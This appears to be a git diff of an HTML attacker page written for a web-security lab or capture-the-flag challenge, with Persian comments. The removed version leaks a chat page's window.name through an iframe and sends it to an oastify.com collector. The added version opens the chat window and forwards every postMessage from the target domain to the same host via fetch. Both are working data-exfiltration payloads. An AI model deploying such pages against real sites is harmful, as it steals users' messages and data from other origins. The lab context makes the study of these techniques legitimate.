@@ -1,35 +1,20 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Window.name Exfil</title>
+    <title>evil</title>
+    <script>
+      // باز کردن پنجره چت
+      let chatWindow = window.open("https://gameserver.websec.saarland/chat", "_blank");
+
+      // دریافت پیام‌ها از صفحه چت
+      window.addEventListener("message", (event) => {
+        if (event.origin.includes("websec.saarland")) {
+          fetch("https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/log?" + encodeURIComponent(event.data));
+        }
+      }, false);
+    </script>
   </head>
   <body>
-    <h1>Loading Chat...</h1>
-    <iframe id="frame" width="600" height="400"></iframe>
-
-    <script>
-      const iframe = document.getElementById('frame');
-
-      // مرحله اول: باز کردن صفحه‌ی چت
-      iframe.src = 'https://gameserver.websec.saarland/chat';
-
-      // بعد از 4 ثانیه، URL رو عوض کن به یه صفحه از دامنه ما (تا SOP اجازه بده name رو بخونیم)
-      setTimeout(() => {
-        iframe.src = 'https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/';
-
-        // بعد از 2 ثانیه، window.name رو بخون و با تصویر به Burp بفرست
-        setTimeout(() => {
-          try {
-            const data = iframe.contentWindow.name;
-            console.log("Leaked window.name:", data);
-
-            // فرستادن اطلاعات به Burp از طریق بارگذاری تصویر
-            new Image().src = `https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/leak?data=` + encodeURIComponent(data);
-          } catch (err) {
-            console.error("Can't access window.name due to SOP", err);
-          }
-        }, 2000);
-      }, 4000);
-    </script>
+    <h1>Loading Owley Chat...</h1>
   </body>
 </html>
